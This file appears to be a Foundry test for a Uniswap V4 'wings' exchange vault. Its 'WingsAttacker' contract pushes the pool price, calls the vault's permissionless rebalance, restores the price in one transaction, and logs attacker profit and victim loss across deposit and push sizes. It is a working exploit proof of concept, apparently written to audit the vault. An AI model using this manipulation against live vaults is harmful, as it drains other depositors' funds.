// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4UpperLowerWingsStandardExchangeVault} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/test/bases/TestBase_UniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVault as IWings} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVault.sol";
import {IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance as Rebalance} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/upperLowerWings/interfaces/IUniswapV4UpperLowerWingsStandardExchangeVaultRebalance.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {UniswapV4UpperLowerWingsStandardExchangeVaultPoolActor as Actor} from "./PoolActor.sol";

/// @notice Unprivileged attacker: push price, call permissionless rebalance, restore price. One tx.
contract WingsAttacker {
    Actor public actor;
    constructor(IPoolManager pool_) { actor = new Actor(pool_, address(this)); }
    function run(PoolKey memory key_, address vault_, bool pushZeroForOne_, uint160 pushLimit_, uint160 restoreLimit_, bool doRebalance_)
        external returns (bool rebalanced_)
    {
        actor.swapTo(key_, pushZeroForOne_, 1e21, pushLimit_);
        if (doRebalance_) {
            try Rebalance(vault_).rebalance(0, block.timestamp) { rebalanced_ = true; } catch (bytes memory r) {
                console2.log("rebalance reverted, selector:"); console2.logBytes(r);
            }
        }
        actor.swapTo(key_, !pushZeroForOne_, 1e21, restoreLimit_);
    }
}

contract WingsForcedDumpTest is TestBase_UniswapV4UpperLowerWingsStandardExchangeVault {
    using StateLibrary for IPoolManager;
    Actor internal externalLp;
    address internal victim;
    uint160 internal p0;

    uint128 internal constant EXT_L = 1e18; // external full-range depth (~1e18 of each raw unit)

    function setUp() public virtual override {
        super.setUp();
        vm.prank(owner); indexedexManager.setDefaultLiquidReservePercentage(0.2e18);
        externalLp = Actor(create3Factory.create3WithArgs(type(Actor).creationCode, abi.encode(pool, address(this)), keccak256("Apex.externalLp")));
        token0.mint(address(externalLp), 1e25); token1.mint(address(externalLp), 1e25);
        externalLp.modify(key, -887220, 887220, int256(uint256(EXT_L)), bytes32(0));
        victim = makeAddr("victim");
    }

    function _seedVault(uint256 deposit_) internal {
        token0.mint(victim, deposit_);
        vm.startPrank(victim);
        token0.approve(address(wings0), type(uint256).max);IStandardExchangeIn(address(wings0)).exchangeIn(token0, deposit_, IERC20(address(wings0)), 0, victim, false, block.timestamp);
        vm.stopPrank();
        address keeper = makeAddr("keeper");
        for (uint256 i; i < 6; ++i) {
            vm.prank(keeper);
            try Rebalance(address(wings0)).rebalance(0, block.timestamp) {} catch { break; }
        }
        // external arbitrage returns the pool to the fair external price (1.0 raw); honest keeper maintains
        for (uint256 j; j < 3; ++j) {
            _arbToFair();
            vm.prank(keeper);
            try Rebalance(address(wings0)).rebalance(0, block.timestamp) {} catch {}
        }
        _arbToFair();
        (p0,,,) = pool.getSlot0(key.toId());
        require(p0 == uint160(1) << 96, "fair");
    }
    function _arbToFair() internal {
        (uint160 pc,,,) = pool.getSlot0(key.toId());
        uint160 fair = uint160(1) << 96;
        if (pc < fair) externalLp.swapTo(key, false, 1e24, fair);
        else if (pc > fair) externalLp.swapTo(key, true, 1e24, fair);
    }

    function _val(uint256 a0, uint256 a1) internal view returns (uint256) {
        return FullMath.mulDiv(FullMath.mulDiv(a0, p0, 1 << 96), p0, 1 << 96) + a1;
    }

    function _logBook(string memory tag) internal view {
        (uint256 l0, uint256 l1) = wings0.localReserves();
        console2.log(tag);
        console2.log("  local0/local1", l0, l1);
        (,, uint128 c,) = wings0.position(0);
        console2.log("  core liq", c);
        (,, c,) = wings0.position(1);
        console2.log("  upper liq", c);
        (,, c,) = wings0.position(2);
        console2.log("  lower liq", c);
        console2.log("  liquidationValue", wings0.liquidationValue().value);
    }

    function _victimRedeemAll() internal returns (uint256 out) {
        uint256 shares = IERC20(address(wings0)).balanceOf(victim);
        vm.prank(victim);out = IStandardExchangeIn(address(wings0)).exchangeIn(IERC20(address(wings0)), shares, token0, 0, victim, false, block.timestamp);
    }

    struct R { int256 profit; int256 loss; bool rebalanced; uint256 control; uint256 got; uint256 lvBefore; uint256 lvAfter; }
    /// returns attacker profit (value at p0) and victim loss (redeem-all vs control)
    function _scenario(int24 pushTicks, bool doRebalance) internal returns (R memory r) {
        uint256 snap = vm.snapshotState();
        r.control = _victimRedeemAll();
        vm.revertToState(snap);
        WingsAttacker attacker = new WingsAttacker(pool);
        address a = address(attacker.actor());
        token0.mint(a, 1e21); token1.mint(a, 1e21);
        int256 v0 = int256(_val(token0.balanceOf(a), token1.balanceOf(a)));
        uint160 limit = TickMath.getSqrtPriceAtTick(TickMath.getTickAtSqrtPrice(p0) + pushTicks);
        r.lvBefore = wings0.liquidationValue().value;
        r.rebalanced = attacker.run(key, address(wings0), pushTicks < 0, limit, p0, doRebalance);
        _checkRestored();
        r.profit = int256(_val(token0.balanceOf(a), token1.balanceOf(a))) - v0;
        r.lvAfter = wings0.liquidationValue().value;
        r.got = _victimRedeemAll();
        r.loss = int256(r.control) - int256(r.got);
        _logR(pushTicks, r);
        vm.revertToState(snap);
    }
    function _checkRestored() internal view {
        (uint160 pAfter,,,) = pool.getSlot0(key.toId());
        require(pAfter == p0, "price not restored");
    }
    function _logR(int24 pushTicks, R memory r) internal pure {
        console2.log("push ticks", pushTicks);
        console2.log("  rebalanced", r.rebalanced);
        console2.log("  attacker profit @p0 (raw)", r.profit);
        console2.log("  victim redeem control / attacked", r.control, r.got);
        console2.log("  victim loss", r.loss);
        console2.log("  liqValue before/after", r.lvBefore, r.lvAfter);
    }

    function test_sweep() public {
        uint256[3] memory deposits = [uint256(1e16), 1e17, 3e17];
        int24[8] memory pushes = [int24(-4000), -2000, -1000, -400, 400, 1000, 2000, 4000];
        for (uint256 d; d < 3; ++d) {
            uint256 snap = vm.snapshotState();
            _seedVault(deposits[d]);
            console2.log("==== deposit", deposits[d]);
            _logBook("seeded book");
            for (uint256 i; i < pushes.length; ++i) {
                R memory x = _scenario(pushes[i], true);
                // baseline: same push & restore without the rebalance (pure round-trip cost)
                R memory y = _scenario(pushes[i], false);
                console2.log("  >> profit delta vs no-rebalance roundtrip", x.profit - y.profit);
                console2.log("  >> loss delta vs no-rebalance roundtrip", x.loss - y.loss);
            }
            vm.revertToState(snap);
        }
    }
}
